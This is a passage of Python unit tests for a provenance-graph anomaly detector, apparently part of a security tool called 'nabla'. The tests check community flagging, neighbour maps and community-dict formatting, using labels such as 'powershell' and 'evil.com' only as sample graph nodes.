        json_lines = [l for l in result.split("\n") if l.startswith("JSON:")]
        data = json.loads(json_lines[0][5:])
        # Only flagged communities appear in JSON
        comm_ids = [c["id"] for c in data["communities"]]
        assert 0 in comm_ids
        comm0 = [c for c in data["communities"] if c["id"] == 0][0]
        assert comm0["flagged"] is True

    def test_neighbor_map_included(self):
        """Anomalous nodes include their neighbor relationships."""
        graph = self._make_graph()
        communities = {
            (NODE_PROCESS, "powershell"): 0,
            (NODE_IP, "10.0.1.50"): 0,
            (NODE_USER, "admin"): 0,
            (NODE_IP, "192.168.1.1"): 1,
            (NODE_DOMAIN, "evil.com"): 1,
        }
        provenance_anomalies = [{"community_id": 0}]
        result = format_provenance_summary(graph, communities, provenance_anomalies)
        json_lines = [l for l in result.split("\n") if l.startswith("JSON:")]
        data = json.loads(json_lines[0][5:])
        comm0 = [c for c in data["communities"] if c["id"] == 0][0]
        assert "neighbors" in comm0
        # powershell has a neighbor (10.0.1.50)
        assert "process:powershell" in comm0["neighbors"]


class TestBuildCommunityDicts:
    """Tests for build_community_dicts helper."""

    def test_empty_communities(self):
        from nabla.provenance import build_community_dicts
        graph = ProvenanceGraph()
        result = build_community_dicts(graph, {}, [])
        assert result == []

    def test_builds_community_dicts(self):
        from nabla.provenance import build_community_dicts
        graph = ProvenanceGraph()
        graph.add_node(NODE_USER, "alice")
        graph.add_node(NODE_HOST, "server1")
        graph.add_node(NODE_PROCESS, "cmd.exe")
        graph.node_anomaly = {(NODE_USER, "alice")}
        communities = {
            (NODE_USER, "alice"): 0,
            (NODE_HOST, "server1"): 0,
            (NODE_PROCESS, "cmd.exe"): 1,
        }
        provenance_anomalies = [{"community_id": 0}]
        result = build_community_dicts(graph, communities, provenance_anomalies)
        assert len(result) == 2
        comm0 = [c for c in result if c["id"] == 0][0]
        assert comm0["size"] == 2
        assert comm0["anomaly_density"] == 0.5
        assert comm0["flagged"] is True
        assert "user:alice" in comm0["anomalous"]
        comm1 = [c for c in result if c["id"] == 1][0]
        assert comm1["size"] == 1
        assert comm1["flagged"] is False

    def test_community_dicts_format_matches_explain(self):
        """Verify community dicts have keys expected by explain_findings."""
        from nabla.provenance import build_community_dicts
        graph = ProvenanceGraph()
        graph.add_node(NODE_USER, "bob")
        graph.add_node(NODE_HOST, "workstation")
        graph.node_anomaly = {(NODE_USER, "bob")}
        communities = {(NODE_USER, "bob"): 0, (NODE_HOST, "workstation"): 0}
        provenance_anomalies = [{"community_id": 0}]
        result = build_community_dicts(graph, communities, provenance_anomalies)
        comm = result[0]
        # Keys expected by compute_graph_counterfactuals
        assert "id" in comm
        assert "members" in comm
        assert "anomaly_density" in comm
